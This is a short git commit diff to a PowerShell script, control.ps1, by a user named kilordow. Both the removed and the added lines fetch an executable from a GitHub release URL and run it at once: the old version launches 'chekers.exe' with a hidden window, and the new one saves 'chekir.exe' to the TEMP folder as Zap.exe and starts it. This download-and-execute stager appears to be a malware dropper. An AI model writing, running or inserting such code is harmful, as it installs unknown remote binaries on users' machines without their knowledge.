056d496f8a70e0ffecc9f33ee8b308bdbe558b69
kilordow <petrovolosuk310@gmail.com>
2026-02-25 18:24:02 +0200

    Update control.ps1

--- control.ps1
+++ control.ps1
@@ -1,8 +1,7 @@
-    # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/chekers.exe" -OutFile "chekers.exe" -ErrorAction SilentlyContinue
-    
-    # Запускаем 
-    Start-Process -FilePath "chekers.exe" -WindowStyle Hidden
+$p="$env:TEMP\Zap.exe"
+iwr https://github.com/kilordow/Fx.exe/releases/download/lol/chekir.exe -o $p
+Start-Process $p
+
 
 
 
